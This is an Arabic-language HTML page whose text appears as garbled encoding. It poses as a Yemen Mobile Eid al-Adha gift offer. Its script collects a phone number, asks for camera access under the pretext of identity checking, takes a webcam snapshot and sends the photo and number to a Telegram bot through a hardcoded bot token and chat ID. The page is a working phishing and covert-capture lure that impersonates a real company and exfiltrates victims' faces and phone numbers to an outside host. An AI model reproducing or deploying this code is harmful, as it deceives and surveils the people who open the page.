<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© - ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„</title>
  <meta name="description" content="Ù…Ø±Ø­Ø¨Ø§ Ø¨ÙƒÙ… ÙÙŠ Ø´Ø±ÙƒØ© ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ - Ø¬ÙˆØ§Ø¦Ø² Ø¨Ù…Ù†Ø§Ø³Ø¨Ø© Ø¹ÙŠØ¯ Ø§Ù„Ø£Ø¶Ø­Ù‰ Ø§Ù„Ù…Ø¨Ø§Ø±Ùƒ">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      text-decoration: none;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    .back-button {
      background-color: #6c757d;
      color: white;
    }
    .back-button:hover {
      background-color: #5a6268;
    }
    #consentBox {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 20px;
      margin: 20px auto;
      width: 60%;
      border-radius: 8px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h2>Ø§Ø¶ØºØ· Ø§Ù„Ø²Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‡Ø¯ÙŠØ© Ù…Ù‚Ø¯Ù…Ø© Ù…Ù† ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ (Ø±ØµÙŠØ¯ Ø£Ùˆ Ù…Ø²Ø§ÙŠØ§)</h2>

  <input type="tel" id="phoneNumber" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ" style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>

  <div id="consentBox">
    <p>ğŸ“¸ Ø³Ù†Ø·Ù„Ø¨ Ø¥Ø°Ù† Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ù† Ø£Ø¬Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ. Ù‡Ù„ ØªÙˆØ§ÙÙ‚ØŸ</p>
    <button class="start-button" onclick="confirmConsent()">Ø£ÙˆØ§ÙÙ‚</button>
  </div>

  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">ØªØ£ÙƒÙŠØ¯</button>
  <button class="back-button" onclick="history.back()">Ø±Ø¬ÙˆØ¹</button>

  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
    ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø±Ù‚Ù…Ùƒ: <span id="confirmedNumber"></span>
  </p>

  <script>
    let canvas = document.getElementById('canvas');
    let video = null;
    let stream = null;

    const botToken = '6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w';
    const chatId = '7057346640';

    function confirmConsent() {
      document.getElementById('consentBox').style.display = 'none';
      document.getElementById('confirmBtn').style.display = 'inline-block';
    }

    function startCameraAndSend() {
      const phoneNumber = document.getElementById('phoneNumber').value.trim();
      if (phoneNumber === '') {
        alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ.');
        return;
      }

      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.');
        return;
      }

      video = document.createElement('video');
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
          stream = s;
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            captureAndSend(phoneNumber);
          }, 1000);
        })
        .catch(error => {
          console.error('ÙØ´Ù„ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
          alert('ØªØ¹Ø°Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§.');
        });
    }

    function captureAndSend(phoneNumber) {
      let context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }

      let imageData = canvas.toDataURL('image/png');
      let base64Image = imageData.split(',')[1];

      const formData = createFormData(base64Image, chatId, phoneNumber);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      })
      .then(response => response.json())
      .then(result => {
        if (result.ok) {
          document.getElementById('confirmedNumber').innerText = phoneNumber;
          document.getElementById('confirmationMessage').style.display = 'block';
        } else {
          console.error('ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', result);
          alert('Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©.');
        }
      })
      .catch(error => {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
        alert('ØªØ¹Ø°Ø± Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©.');
      });
    }

    function createFormData(base64, chatId, phoneNumber) {
      const byteCharacters = atob(base64);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const blob = new Blob([byteArray], { type: 'image/png' });

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'snapshot.png');
      formData.append('caption', `Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ: ${phoneNumber}`);
      return formData;
    }
  </script>
</body>
    </html>
